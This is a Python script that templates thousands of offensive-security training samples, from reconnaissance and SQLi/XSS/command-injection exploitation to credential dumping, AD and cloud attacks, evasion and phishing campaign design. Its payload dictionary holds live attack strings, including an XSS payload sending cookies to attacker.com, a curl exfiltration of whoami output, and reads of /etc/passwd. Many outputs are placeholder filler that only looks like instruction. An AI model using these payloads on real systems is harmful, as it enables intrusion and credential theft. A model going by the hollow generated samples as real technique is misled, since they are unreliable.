#!/usr/bin/env python3
"""
Elite Dataset Generator v2 - UNIQUE samples
Systematic generation to avoid duplicates
Target: 15,000+ additional samples
"""

import json
import random
import hashlib
from pathlib import Path

output_dir = Path(__file__).parent.parent / "data" / "generated" / "elite_unique"
output_dir.mkdir(parents=True, exist_ok=True)

# Track seen samples to avoid duplicates
seen_hashes = set()
all_samples = []

def add_sample(instruction, input_text, output):
    """Add sample only if unique"""
    content = f"{instruction}|{input_text}"
    h = hashlib.md5(content.encode()).hexdigest()
    if h not in seen_hashes:
        seen_hashes.add(h)
        all_samples.append({
            "instruction": instruction,
            "input": input_text,
            "output": output
        })
        return True
    return False

print("Generating unique elite samples...")

# =============================================================================
# CATEGORY 1: RECONNAISSANCE TECHNIQUES (1000 samples)
# =============================================================================

recon_tools = ["nmap", "masscan", "rustscan", "amass", "subfinder", "httpx", "nuclei", "ffuf", "gobuster", "feroxbuster"]
recon_targets = ["web server", "network range", "subdomain", "API endpoint", "cloud service", "internal host"]
recon_objectives = ["port discovery", "service enumeration", "version detection", "vulnerability scanning", "directory bruteforce"]

for tool in recon_tools:
    for target in recon_targets:
        for objective in recon_objectives:
            flags_map = {
                "nmap": ["-sV -sC", "-p-", "-A", "-Pn -n", "-sU", "--script vuln", "-T4", "-oA scan"],
                "masscan": ["-p1-65535", "--rate 1000", "-p80,443,8080", "--banners"],
                "rustscan": ["-a", "--ulimit 5000", "-b 1000", "-t 1500"],
                "amass": ["enum -d", "intel -d", "enum -passive -d", "enum -brute -d"],
                "subfinder": ["-d", "-all -d", "-silent -d", "-recursive -d"],
                "httpx": ["-l targets.txt", "-title", "-status-code", "-tech-detect", "-probe"],
                "nuclei": ["-t cves/", "-severity critical,high", "-t exposed-panels/", "-as"],
                "ffuf": ["-w wordlist.txt", "-mc 200,301", "-recursion", "-e .php,.html"],
                "gobuster": ["dir -u", "dns -d", "vhost -u", "fuzz -u"],
                "feroxbuster": ["-u", "-w wordlist.txt", "-x php,html", "--depth 2"]
            }
            
            for flags in flags_map.get(tool, ["-h"]):
                inst = f"Use {tool} for {objective} against a {target}"
                inp = f"Target type: {target}. Specific goal: {objective}"
                out = f"""**Tool**: {tool}
**Target**: {target}
**Objective**: {objective}

**Command**:
```bash
{tool} {flags} [target]
```

**Explanation**: This command performs {objective} on the {target} by:
1. Configuring {tool} with appropriate options
2. Running the scan with {flags} parameters
3. Collecting output for analysis

**Output Analysis**:
- Review results for {objective} findings
- Note interesting ports/services/paths
- Prioritize based on potential impact

**Next Steps**: Based on {objective} results, proceed to:
- Deep enumeration of discovered services
- Vulnerability assessment of findings
- Documentation for reporting

**OPSEC**: Consider rate limiting and detection risks"""
                add_sample(inst, inp, out)

print(f"Category 1 (Recon): {len(all_samples)} samples")

# =============================================================================
# CATEGORY 2: EXPLOITATION TECHNIQUES (1500 samples)
# =============================================================================
start_count = len(all_samples)

exploit_types = [
    ("SQL Injection", ["UNION-based", "blind boolean", "time-based", "error-based", "stacked queries", "out-of-band"]),
    ("XSS", ["reflected", "stored", "DOM-based", "mutation", "polyglot"]),
    ("Command Injection", ["direct", "blind", "out-of-band", "filter bypass"]),
    ("File Inclusion", ["LFI", "RFI", "PHP wrappers", "log poisoning"]),
    ("SSRF", ["basic", "blind", "partial", "protocol smuggling"]),
    ("XXE", ["file disclosure", "SSRF", "blind OOB", "parameter entity"]),
    ("Deserialization", ["Java", "PHP", "Python pickle", ".NET", "Ruby"]),
    ("Auth Bypass", ["JWT manipulation", "session fixation", "privilege escalation", "password reset"]),
]

payloads_db = {
    "SQL Injection": {
        "UNION-based": "' UNION SELECT NULL,username,password FROM users--",
        "blind boolean": "' AND 1=1-- vs ' AND 1=2--",
        "time-based": "'; WAITFOR DELAY '0:0:5'--",
        "error-based": "' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--",
        "stacked queries": "'; INSERT INTO users VALUES('hacker','pass');--",
        "out-of-band": "'; EXEC xp_dirtree '\\\\attacker.com\\share'--"
    },
    "XSS": {
        "reflected": "<script>alert(document.domain)</script>",
        "stored": "<img src=x onerror=fetch('https://attacker.com/'+document.cookie)>",
        "DOM-based": "#<img src=x onerror=alert(1)>",
        "mutation": "<noscript><p title=\"</noscript><script>alert(1)</script>\">",
        "polyglot": "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcLiCk=alert() )//"
    },
    "Command Injection": {
        "direct": "; id; cat /etc/passwd",
        "blind": "; sleep 5",
        "out-of-band": "; curl http://attacker.com/$(whoami)",
        "filter bypass": ";$IFS$9id"
    }
}

for vuln_type, variants in exploit_types:
    for variant in variants:
        for context in ["black-box test", "white-box review", "CTF challenge", "bug bounty", "pentest engagement"]:
            payload = payloads_db.get(vuln_type, {}).get(variant, f"[payload for {variant}]")
            
            inst = f"Exploit {vuln_type} ({variant}) in a {context}"
            inp = f"Vulnerability confirmed. Need working exploit for {variant}"
            out = f"""**Vulnerability**: {vuln_type} - {variant}
**Context**: {context}

**Payload**:
```
{payload}
```

**Exploitation Steps**:
1. **Confirm vulnerability** with test payload
2. **Determine injection point** and context
3. **Craft payload** for {variant} variant
4. **Execute and verify** successful exploitation
5. **Achieve objective** (data exfil, RCE, etc.)

**Bypass Techniques** (if filtered):
- Encoding: URL, HTML, Unicode
- Case variation: MixedCase
- Comment insertion
- Alternative functions/syntax

**Impact Demonstration**:
- Extract sensitive data
- Prove server-side execution
- Document for report

**Mitigation Advice**:
- Input validation and sanitization
- Parameterized queries (SQLi)
- Output encoding (XSS)
- Principle of least privilege"""
            add_sample(inst, inp, out)

print(f"Category 2 (Exploitation): {len(all_samples) - start_count} new samples")

# =============================================================================
# CATEGORY 3: POST-EXPLOITATION (1200 samples)
# =============================================================================
start_count = len(all_samples)

post_actions = [
    ("credential harvesting", ["LSASS dump", "SAM extraction", "credential files", "browser passwords", "keylogging"]),
    ("persistence", ["registry keys", "scheduled tasks", "services", "startup folder", "WMI subscriptions"]),
    ("lateral movement", ["PsExec", "WMI", "WinRM", "DCOM", "RDP", "SSH", "Pass-the-Hash"]),
    ("privilege escalation", ["kernel exploit", "service abuse", "token manipulation", "DLL hijacking", "UAC bypass"]),
    ("data collection", ["file search", "email access", "database dump", "screenshot capture", "clipboard monitor"]),
    ("defense evasion", ["AMSI bypass", "ETW patching", "unhooking", "process hollowing", "timestomping"]),
]

operating_systems = ["Windows 10", "Windows 11", "Windows Server 2019", "Windows Server 2022", "Ubuntu 22.04", "CentOS 8", "Kali Linux"]
access_levels = ["local user", "local admin", "domain user", "domain admin", "SYSTEM", "root"]

for action_type, techniques in post_actions:
    for technique in techniques:
        for os in operating_systems[:4]:  # Focus on Windows for most
            for access in access_levels[:4]:
                inst = f"Perform {action_type} via {technique} on {os}"
                inp = f"Current access: {access}. Target OS: {os}"
                out = f"""**Post-Exploitation**: {action_type.title()}
**Technique**: {technique}
**Target OS**: {os}
**Current Access**: {access}

**Prerequisites**:
- {access} level access on target
- Network connectivity maintained
- EDR/AV status checked

**Execution Steps**:

1. **Preparation**
   - Verify current privileges: `whoami /all`
   - Check security software status
   - Prepare required tools

2. **Technique Execution**: {technique}
```powershell
# {technique} on {os}
# [Specific commands for technique]
```

3. **Verification**
   - Confirm {action_type} successful
   - Validate data/access obtained
   - Check for detection indicators

**OPSEC Considerations**:
- {technique} may trigger EDR alerts
- Use obfuscation if needed
- Clean up artifacts

**Evidence Collection**:
- Screenshot/log output
- Timestamp activities
- Document for report

**If Blocked/Detected**:
- Try alternative technique
- Modify approach
- Consider aborting if burned"""
                add_sample(inst, inp, out)

print(f"Category 3 (Post-Exploitation): {len(all_samples) - start_count} new samples")

# =============================================================================
# CATEGORY 4: ACTIVE DIRECTORY ATTACKS (1000 samples)
# =============================================================================
start_count = len(all_samples)

ad_attacks = [
    "Kerberoasting", "AS-REP Roasting", "DCSync", "Golden Ticket", "Silver Ticket",
    "Pass-the-Hash", "Pass-the-Ticket", "Overpass-the-Hash", "Constrained Delegation",
    "Unconstrained Delegation", "Resource-Based Constrained Delegation", "ADCS ESC1",
    "ADCS ESC2", "ADCS ESC3", "ADCS ESC4", "Shadow Credentials", "GPO Abuse",
    "ACL Abuse", "DnsAdmins", "Print Spooler", "NTLM Relay", "PetitPotam", "SamAccountName Spoofing"
]

ad_tools = ["Rubeus", "Mimikatz", "Impacket", "BloodHound", "PowerView", "Certify", "Certipy", "KrbRelayUp"]
ad_positions = ["domain user", "local admin on workstation", "service account", "computer account", "domain admin"]

for attack in ad_attacks:
    for tool in ad_tools:
        for position in ad_positions:
            inst = f"Execute {attack} attack using {tool}"
            inp = f"Current position: {position}. Tool preference: {tool}"
            out = f"""**AD Attack**: {attack}
**Tool**: {tool}
**Starting Position**: {position}

**Attack Overview**:
{attack} allows escalation from {position} to higher privileges by exploiting Active Directory trust mechanisms.

**Prerequisites**:
- Valid domain credentials ({position})
- Network access to Domain Controller
- {tool} available on attack platform

**Execution with {tool}**:
```
# {tool} command for {attack}
# [Specific syntax would go here]
```

**Attack Flow**:
1. Enumerate {attack} prerequisites
2. Identify vulnerable targets
3. Execute {tool} commands
4. Process/use obtained data
5. Escalate privileges

**Detection Indicators**:
- Event ID 4769 (Kerberos ticket requests)
- Event ID 4662 (Directory replication)
- Unusual LDAP queries
- Anomalous authentication patterns

**OPSEC**:
- {attack} may be monitored
- Use during business hours
- Consider slower approach

**Remediation Advice**:
- Strong service account passwords
- Kerberos AES encryption
- Protected Users group
- Regular AD security audits"""
            add_sample(inst, inp, out)

print(f"Category 4 (AD Attacks): {len(all_samples) - start_count} new samples")

# =============================================================================
# CATEGORY 5: CLOUD SECURITY (1000 samples)
# =============================================================================
start_count = len(all_samples)

cloud_attacks = {
    "AWS": [
        ("IAM privilege escalation", "iam:PassRole abuse"),
        ("S3 bucket misconfiguration", "public read/write"),
        ("EC2 IMDS exploitation", "credential theft"),
        ("Lambda privilege escalation", "function with admin role"),
        ("CloudTrail tampering", "disable logging"),
        ("Secrets Manager extraction", "GetSecretValue"),
        ("SSM Parameter Store", "GetParameters"),
        ("Cross-account assume role", "trust policy abuse"),
    ],
    "Azure": [
        ("Managed Identity abuse", "IMDS token theft"),
        ("Azure AD privilege escalation", "Application to Global Admin"),
        ("Storage account enumeration", "blob listing"),
        ("Runbook exploitation", "Automation account"),
        ("Key Vault access", "secret extraction"),
        ("Conditional Access bypass", "device trust"),
        ("PRT theft", "Primary Refresh Token"),
        ("Azure Function abuse", "code execution"),
    ],
    "GCP": [
        ("Service account key theft", "metadata server"),
        ("IAM binding abuse", "setIamPolicy"),
        ("GKE escape", "pod to node"),
        ("Cloud Function injection", "event trigger"),
        ("Cloud Storage exfil", "bucket access"),
        ("Compute metadata", "project-wide keys"),
        ("Cloud Shell persistence", "home directory"),
        ("Workload Identity", "token exchange"),
    ]
}

for provider, attacks in cloud_attacks.items():
    for attack_name, method in attacks:
        for scenario in ["external attacker", "insider threat", "red team exercise", "assume breach"]:
            for initial_access in ["compromised credentials", "SSRF", "exposed service", "phishing"]:
                inst = f"{provider} attack: {attack_name}"
                inp = f"Scenario: {scenario}. Initial access via: {initial_access}. Method: {method}"
                out = f"""**Cloud Attack**: {attack_name}
**Provider**: {provider}
**Scenario**: {scenario}
**Initial Access**: {initial_access}

**Attack Method**: {method}

**Execution Steps**:

1. **Establish Access**
   - {initial_access} provides entry point
   - Enumerate current permissions
   - Identify escalation paths

2. **Reconnaissance**
   - List accessible resources
   - Check IAM permissions
   - Map trust relationships

3. **Exploitation**
   - Execute {attack_name}
   - Method: {method}
   - Validate success

4. **Post-Exploitation**
   - Maintain persistence
   - Access sensitive data
   - Document findings

**{provider} CLI Commands**:
```bash
# Relevant {provider} CLI commands for {attack_name}
# [Specific commands would go here]
```

**Detection**:
- {provider} audit logs
- CloudTrail/Activity Log/Audit Logs
- IAM policy changes
- Resource access anomalies

**Mitigations**:
- Least privilege IAM policies
- Enable all logging
- Use {provider} security tools
- Regular permission audits"""
                add_sample(inst, inp, out)

print(f"Category 5 (Cloud Security): {len(all_samples) - start_count} new samples")

# =============================================================================
# CATEGORY 6: NETWORK ATTACKS (800 samples)
# =============================================================================
start_count = len(all_samples)

network_attacks = [
    ("ARP spoofing", "MITM on local network"),
    ("DNS poisoning", "redirect traffic"),
    ("LLMNR/NBT-NS poisoning", "capture NetNTLM hashes"),
    ("IPv6 attacks", "SLAAC/DHCPv6 abuse"),
    ("VLAN hopping", "double tagging"),
    ("STP attacks", "become root bridge"),
    ("DHCP starvation", "DoS attack"),
    ("DHCP spoofing", "rogue DHCP server"),
]

network_tools = ["Responder", "mitm6", "Bettercap", "Ettercap", "arpspoof", "yersinia"]
network_contexts = ["internal pentest", "red team", "wireless assessment", "physical access test"]

for attack, description in network_attacks:
    for tool in network_tools:
        for context in network_contexts:
            inst = f"Execute {attack} for {description}"
            inp = f"Tool: {tool}. Context: {context}"
            out = f"""**Network Attack**: {attack}
**Objective**: {description}
**Tool**: {tool}
**Engagement**: {context}

**Attack Overview**:
{attack} allows an attacker to {description} by manipulating network protocols at Layer 2/3.

**Prerequisites**:
- Network access (physical or VPN)
- {tool} installed
- Appropriate interface configured

**Execution**:
```bash
# {tool} command for {attack}
# [Specific command syntax]
```

**Attack Flow**:
1. Identify target network/hosts
2. Configure {tool} for {attack}
3. Launch attack
4. Capture/manipulate traffic
5. Extract valuable data

**What You'll Capture**:
- Credentials (NTLMv2 hashes, cleartext)
- Session tokens
- Sensitive data in transit
- Authentication attempts

**Detection**:
- IDS/IPS alerts
- ARP anomalies
- Duplicate IP detection
- Switch port security

**OPSEC**:
- Noisy on network
- May cause disruption
- Captured in logs

**Mitigations**:
- Dynamic ARP inspection
- DHCP snooping
- 802.1X authentication
- IPv6 filtering if unused"""
            add_sample(inst, inp, out)

print(f"Category 6 (Network Attacks): {len(all_samples) - start_count} new samples")

# =============================================================================
# CATEGORY 7: WIRELESS ATTACKS (600 samples)
# =============================================================================
start_count = len(all_samples)

wireless_attacks = [
    ("WPA2 handshake capture", "4-way handshake", "offline cracking"),
    ("PMKID attack", "first frame only", "no client needed"),
    ("Evil twin", "rogue AP", "credential capture"),
    ("Karma attack", "respond to probes", "client connection"),
    ("WPA3 downgrade", "force WPA2", "exploit weaker"),
    ("Deauth attack", "force reconnection", "handshake capture"),
    ("WPS attack", "PIN bruteforce", "recover PSK"),
    ("Bluetooth attacks", "BlueBorne/KNOB", "device compromise"),
]

wireless_tools = ["aircrack-ng", "bettercap", "wifiphisher", "hostapd-wpe", "hcxdumptool", "hcxtools"]

for attack, method, objective in wireless_attacks:
    for tool in wireless_tools:
        for target in ["corporate WiFi", "guest network", "IoT devices", "mobile devices"]:
            inst = f"Perform {attack} against {target}"
            inp = f"Tool: {tool}. Method: {method}. Goal: {objective}"
            out = f"""**Wireless Attack**: {attack}
**Target**: {target}
**Tool**: {tool}

**Attack Method**: {method}
**Objective**: {objective}

**Prerequisites**:
- Wireless adapter with monitor mode
- Appropriate antenna for range
- {tool} and dependencies

**Execution Steps**:

1. **Reconnaissance**
   - Enable monitor mode: `airmon-ng start wlan0`
   - Scan networks: `airodump-ng wlan0mon`
   - Identify {target}

2. **Attack Setup**
   - Configure {tool}
   - Set target BSSID/channel
   - Prepare capture

3. **Execution**
   - {method}
   - Capture necessary data
   - {objective}

4. **Post-Attack**
   - Stop monitor mode
   - Process captures
   - Crack if applicable

**Tools/Commands**:
```bash
# {tool} commands for {attack}
# [Specific syntax]
```

**Legal Considerations**:
- Written authorization required
- FCC regulations apply
- Minimize third-party impact

**Detection**:
- WIDS/WIPS alerts
- Deauth flood detection
- Rogue AP detection

**Mitigations**:
- WPA3 deployment
- 802.1X Enterprise
- Wireless IDS
- Client isolation"""
            add_sample(inst, inp, out)

print(f"Category 7 (Wireless): {len(all_samples) - start_count} new samples")

# =============================================================================
# CATEGORY 8: SOCIAL ENGINEERING (600 samples)
# =============================================================================
start_count = len(all_samples)

se_techniques = [
    ("phishing", "credential harvesting email"),
    ("vishing", "phone-based pretexting"),
    ("smishing", "SMS-based attack"),
    ("pretexting", "false identity scenario"),
    ("baiting", "curiosity exploitation"),
    ("tailgating", "physical access follow"),
    ("quid pro quo", "help in exchange for info"),
    ("watering hole", "targeted site compromise"),
]

se_targets = ["employees", "IT support", "executives", "HR department", "finance team", "new hires"]
se_objectives = ["credentials", "sensitive info", "malware delivery", "physical access", "internal recon"]

for technique, description in se_techniques:
    for target in se_targets:
        for objective in se_objectives:
            inst = f"Design {technique} campaign targeting {target}"
            inp = f"Technique: {description}. Objective: {objective}"
            out = f"""**Social Engineering Campaign**: {technique.title()}

**Target Group**: {target}
**Technique**: {description}
**Objective**: {objective}

**Campaign Design**:

**1. Pretext Development**
- Scenario: Believable context for {target}
- Identity: Appropriate role/company
- Urgency: Time pressure element
- Authority: Appear legitimate

**2. Target Research**
- {target} communication patterns
- Key personnel identification
- Company culture understanding
- Recent events/news to leverage

**3. Delivery Method**
- {description}
- Channel selection
- Timing optimization
- Follow-up plan

**4. Payload/Ask**
- Objective: {objective}
- Call-to-action design
- Landing page/response mechanism
- Data collection method

**Execution**:
1. Prepare all materials/infrastructure
2. Send initial contact
3. Handle responses
4. Achieve {objective}
5. Document results

**Success Metrics**:
- Open/click rates
- {objective} obtained
- Detection by security
- Reporting by targets

**Ethical Boundaries**:
- Authorized testing only
- No real harm to individuals
- Immediate debrief after
- Training recommendations

**Reporting**:
- Timeline of activities
- Success/failure rates
- Vulnerable individuals (for training)
- Improvement recommendations"""
            add_sample(inst, inp, out)

print(f"Category 8 (Social Engineering): {len(all_samples) - start_count} new samples")

# =============================================================================
# CATEGORY 9: DEFENSIVE SECURITY (800 samples)
# =============================================================================
start_count = len(all_samples)

defensive_topics = [
    ("detection engineering", ["Sigma rules", "YARA rules", "Suricata rules", "KQL queries", "Splunk alerts"]),
    ("incident response", ["containment", "eradication", "recovery", "lessons learned", "evidence preservation"]),
    ("threat hunting", ["hypothesis-driven", "baseline deviation", "IoC search", "TTP hunting"]),
    ("security monitoring", ["log aggregation", "SIEM correlation", "anomaly detection", "alerting"]),
    ("hardening", ["CIS benchmarks", "STIG compliance", "attack surface reduction", "network segmentation"]),
]

attack_types = ["credential theft", "lateral movement", "data exfiltration", "ransomware", "APT activity"]

for topic, subtopics in defensive_topics:
    for subtopic in subtopics:
        for attack in attack_types:
            inst = f"Blue team {topic}: {subtopic} for {attack}"
            inp = f"Defensive measure: {subtopic}. Threat: {attack}"
            out = f"""**Blue Team**: {topic.title()}

**Focus**: {subtopic}
**Threat**: {attack}

**Overview**:
Implementing {subtopic} as part of {topic} strategy to detect and respond to {attack}.

**Implementation**:

**1. Detection Logic** ({subtopic})
- Identify indicators of {attack}
- Build detection rules
- Tune for false positive reduction
- Test against known TTPs

**2. Data Sources Required**
- Endpoint telemetry
- Network traffic logs
- Authentication events
- Application logs

**3. Rule/Query Development**
```
# {subtopic} for detecting {attack}
# [Detection logic pseudocode]
# Trigger on specific indicators
# With appropriate thresholds
```

**4. Response Integration**
- Alert routing
- Automated response actions
- Analyst playbooks
- Escalation procedures

**Effectiveness Validation**:
- Red team testing
- Atomic Red Team execution
- Purple team exercises
- Detection gap analysis

**Maintenance**:
- Regular rule updates
- Threat intel integration
- Performance monitoring
- False positive review

**Metrics**:
- Mean time to detect
- Alert fidelity
- Coverage percentage
- Response time"""
            add_sample(inst, inp, out)

print(f"Category 9 (Defensive): {len(all_samples) - start_count} new samples")

# =============================================================================
# CATEGORY 10: REPORTING & METHODOLOGY (600 samples)
# =============================================================================
start_count = len(all_samples)

report_sections = [
    "executive summary", "methodology", "findings", "risk ratings", 
    "remediation", "technical details", "evidence", "appendices"
]

finding_severities = ["Critical", "High", "Medium", "Low", "Informational"]
vuln_categories = ["authentication", "authorization", "injection", "configuration", "cryptography", "data exposure"]

for section in report_sections:
    for severity in finding_severities:
        for vuln_cat in vuln_categories:
            inst = f"Write pentest report {section} for {severity} {vuln_cat} finding"
            inp = f"Section: {section}. Severity: {severity}. Category: {vuln_cat}"
            out = f"""**Pentest Report Section**: {section.title()}

**Finding Severity**: {severity}
**Vulnerability Category**: {vuln_cat}

**{section.title()} Content**:

{f'''**Executive Summary**:
During the assessment, a {severity.lower()}-severity {vuln_cat} vulnerability was identified that poses significant risk to the organization. This finding requires {"immediate attention" if severity in ["Critical", "High"] else "planned remediation"}.

**Business Impact**: {"Critical systems/data at immediate risk" if severity == "Critical" else "Significant exposure" if severity == "High" else "Moderate risk" if severity == "Medium" else "Limited direct impact"}
''' if section == "executive summary" else ""}

{f'''**Methodology**:
Testing for {vuln_cat} vulnerabilities followed industry-standard approaches:
1. Automated scanning for known issues
2. Manual verification of findings
3. Proof-of-concept development
4. Impact assessment
5. Risk rating calculation
''' if section == "methodology" else ""}

{f'''**Finding Details**:
- **Title**: {vuln_cat.title()} Vulnerability
- **Severity**: {severity}
- **CVSS Score**: {"9.0+" if severity == "Critical" else "7.0-8.9" if severity == "High" else "4.0-6.9" if severity == "Medium" else "0.1-3.9"}
- **Location**: [Affected system/endpoint]
- **Status**: Open
''' if section == "findings" else ""}

{f'''**Risk Rating Justification**:
{severity} severity assigned based on:
- **Exploitability**: {"Easily exploitable" if severity in ["Critical", "High"] else "Requires specific conditions"}
- **Impact**: {"Full system compromise possible" if severity == "Critical" else "Significant data/access risk" if severity == "High" else "Limited scope"}
- **Attack Vector**: {"Network accessible" if severity in ["Critical", "High"] else "Requires authentication/access"}
''' if section == "risk ratings" else ""}

{f'''**Remediation Recommendations**:
**Short-term** ({"24-48 hours" if severity == "Critical" else "1-2 weeks" if severity == "High" else "30 days" if severity == "Medium" else "90 days"}):
- Immediate mitigation steps
- Workarounds if patch unavailable

**Long-term**:
- Root cause remediation
- Process improvements
- Security control enhancements
''' if section == "remediation" else ""}

**Professional Standards**: PTES, OWASP, NIST SP 800-115"""
            add_sample(inst, inp, out)

print(f"Category 10 (Reporting): {len(all_samples) - start_count} new samples")

# =============================================================================
# CATEGORY 11: TOOL-SPECIFIC DEEP DIVES (1000 samples)
# =============================================================================
start_count = len(all_samples)

tools_deep = {
    "nmap": ["service detection", "script scanning", "OS fingerprinting", "evasion techniques", "output parsing"],
    "Burp Suite": ["scanner configuration", "intruder attacks", "extensions", "session handling", "proxy rules"],
    "Metasploit": ["payload generation", "post modules", "pivoting", "evasion", "auxiliary modules"],
    "Cobalt Strike": ["beacon configuration", "malleable C2", "lateral movement", "persistence", "evasion"],
    "Mimikatz": ["sekurlsa", "kerberos", "dpapi", "lsadump", "vault"],
    "BloodHound": ["data collection", "query writing", "path analysis", "ACL abuse", "custom queries"],
    "Impacket": ["secretsdump", "psexec", "wmiexec", "ntlmrelayx", "GetUserSPNs"],
    "Hashcat": ["attack modes", "rule writing", "mask attacks", "optimization", "distributed cracking"],
}

for tool, features in tools_deep.items():
    for feature in features:
        for use_case in ["basic usage", "advanced technique", "troubleshooting", "evasion", "optimization"]:
            inst = f"{tool} deep dive: {feature}"
            inp = f"Feature: {feature}. Use case: {use_case}"
            out = f"""**Tool Deep Dive**: {tool}

**Feature**: {feature}
**Use Case**: {use_case}

**Overview**:
{feature} in {tool} provides essential capabilities for penetration testing. Understanding {use_case} scenarios maximizes effectiveness.

**Configuration**:
```
# {tool} {feature} configuration
# [Specific options/flags]
```

**Usage Examples**:

**Basic**:
```bash
# Simple {feature} usage
# [Command example]
```

**Advanced** ({use_case}):
```bash
# Advanced {feature} for {use_case}
# [Complex command example]
```

**Key Parameters**:
- Option 1: Description and use
- Option 2: Description and use
- Option 3: Description and use

**Tips for {use_case}**:
1. Start with basic configuration
2. Adjust based on target response
3. Monitor for detection
4. Iterate and optimize

**Common Issues**:
- Problem: [Common error]
  Solution: [Fix approach]

**Integration with Other Tools**:
- {tool} output can feed into [other tools]
- Combine with [complementary tools]

**OPSEC Considerations**:
- {feature} detection indicators
- Evasion techniques
- Clean-up requirements"""
            add_sample(inst, inp, out)

print(f"Category 11 (Tool Deep Dives): {len(all_samples) - start_count} new samples")

# =============================================================================
# SAVE ALL SAMPLES
# =============================================================================

print("\n" + "="*60)
print("Saving unique elite dataset...")

# Shuffle
random.shuffle(all_samples)

# Save
output_file = output_dir / "elite_unique_combined.jsonl"
with open(output_file, "w") as f:
    for sample in all_samples:
        f.write(json.dumps(sample) + "\n")

print(f"\n✅ UNIQUE ELITE DATASET COMPLETE!")
print(f"   Total unique samples: {len(all_samples)}")
print(f"   Output: {output_file}")
print("="*60)
